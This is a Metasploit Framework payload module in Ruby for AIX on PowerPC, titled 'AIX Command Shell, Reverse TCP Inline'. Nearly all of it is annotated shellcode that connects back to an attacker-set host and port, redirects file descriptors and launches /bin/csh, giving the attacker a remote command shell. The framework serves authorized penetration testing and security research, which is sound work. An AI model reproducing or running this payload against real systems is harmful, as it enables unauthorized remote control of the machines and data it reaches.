##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Aix
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'AIX Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Ramon de C Valle',
			'License'       => MSF_LICENSE,
			'Platform'      => 'aix',
			'Arch'          => ARCH_PPC,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 32, 'ADDR' ],
							'LPORT'    => [ 30, 'n'    ],
						},
				}
		))

	end

	def generate(*args)
		super(*args)

		payload =
		"\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
		"\x40\x82\xff\xfd"     +#   bnel    <cntsockcode>              #
		"\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
		"\x3b\xde\x01\xff"     +#   cal     r30,511(r30)               #
		"\x3b\xde\xfe\x25"     +#   cal     r30,-475(r30)              #
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x20"     +#   bctr                               #
		"\xff\x02\x11\x5c"     +#   .long   0xff02115c                 #
		"\x7f\x00\x00\x01"     +#   .long   0x7f000001                 #
		"\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
		"\x44\xff\xff\x02"     +#   svca    0                          #
		"\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
		"\x3b\xa0\x07\xff"     +#   lil     r29,2047                   #
		"\x38\x9d\xf8\x02"     +#   cal     r4,-2046(r29)              #
		"\x38\x7d\xf8\x03"     +#   cal     r3,-2045(r29)              #
		@cal_socket +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7c\x7c\x1b\x78"     +#   mr      r28,r3                     #
		"\x38\xbd\xf8\x11"     +#   cal     r5,-2031(r29)              #
		"\x38\x9e\xff\xf8"     +#   cal     r4,-8(r30)                 #
		@cal_connect +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x3b\x7d\xf8\x03"     +#   cal     r27,-2045(r29)             #
		"\x7f\x63\xdb\x78"     +#   mr      r3,r27                     #
		@cal_close +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x7f\x65\xdb\x78"     +#   mr      r5,r27                     #
		"\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
		"\x7f\x83\xe3\x78"     +#   mr      r3,r28                     #
		@cal_kfcntl +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"\x37\x7b\xff\xff"     +#   ai.     r27,r27,-1                 #
		"\x40\x80\xff\xd4"     +#   bge     <cntsockcode+100>          #
		"\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
		"\x40\x82\xff\xfd"     +#   bnel    <cntsockcode+148>          #
		"\x7f\x08\x02\xa6"     +#   mflr    r24                        #
		"\x3b\x18\x01\xff"     +#   cal     r24,511(r24)               #
		"\x38\x78\xfe\x29"     +#   cal     r3,-471(r24)               #
		"\x98\xb8\xfe\x31"     +#   stb     r5,-463(r24)               #
		"\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
		"\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
		@cal_execve +
		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
		"\x4e\x80\x04\x21"     +#   bctrl                              #
		"/bin/csh"

		# If the payload is generated and there are offsets to substitute,
		# do that now.
		if (payload and offsets)
			substitute_vars(payload, offsets)
		end

		payload
	end

end
